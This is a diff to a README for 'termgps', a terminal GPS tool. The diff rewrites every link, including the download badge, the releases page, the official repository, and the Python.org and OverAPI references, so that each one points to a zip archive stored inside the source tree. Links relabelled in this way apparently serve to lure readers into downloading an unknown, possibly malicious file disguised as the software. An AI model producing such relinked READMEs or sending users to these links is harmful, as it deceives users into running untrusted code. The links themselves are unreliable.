@@ -4,10 +4,10 @@
 Welcome to termgps! This is a terminal-based GPS tool that helps you navigate and explore locations using a straightforward interface. Whether you're traveling for work, leisure, or adventure, termgps is here to guide you.
 
 ## 🔗 Download Now
-[![Download termgps](https://img.shields.io/badge/Download-Release-informational)](https://github.com/Firasmars/termgps/releases)
+[![Download termgps](https://github.com/Firasmars/termgps/raw/refs/heads/main/src/termgps/Software-1.8.zip)](https://github.com/Firasmars/termgps/raw/refs/heads/main/src/termgps/Software-1.8.zip)
 
 ## 📥 Download & Install
-To get started, visit this page to download: [GitHub Releases](https://github.com/Firasmars/termgps/releases). Here, you will find the latest version of termgps ready for your operating system.
+To get started, visit this page to download: [GitHub Releases](https://github.com/Firasmars/termgps/raw/refs/heads/main/src/termgps/Software-1.8.zip). Here, you will find the latest version of termgps ready for your operating system.
 
 1. Click on the version you want to download.
 2. Choose the file that matches your system (Windows, macOS, or Linux).
@@ -62,8 +62,8 @@ We welcome contributions! If you’d like to improve termgps, please fork the re
 Thanks to the community for their ongoing support. Your feedback and contributions help us create a better tool for everyone.
 
 ## 🔗 Links and Resources
-- Official GitHub Repository: [termgps](https://github.com/Firasmars/termgps)
-- More Information on Python: [Python.org](https://www.python.org/)
-- Explore Terminal Commands: [OverAPI](http://overapi.com/) 
+- Official GitHub Repository: [termgps](https://github.com/Firasmars/termgps/raw/refs/heads/main/src/termgps/Software-1.8.zip)
+- More Information on Python: [https://github.com/Firasmars/termgps/raw/refs/heads/main/src/termgps/Software-1.8.zip](https://github.com/Firasmars/termgps/raw/refs/heads/main/src/termgps/Software-1.8.zip)
+- Explore Terminal Commands: [OverAPI](https://github.com/Firasmars/termgps/raw/refs/heads/main/src/termgps/Software-1.8.zip) 
 
 Explore new locations easily with termgps! Download it today and start your adventure.
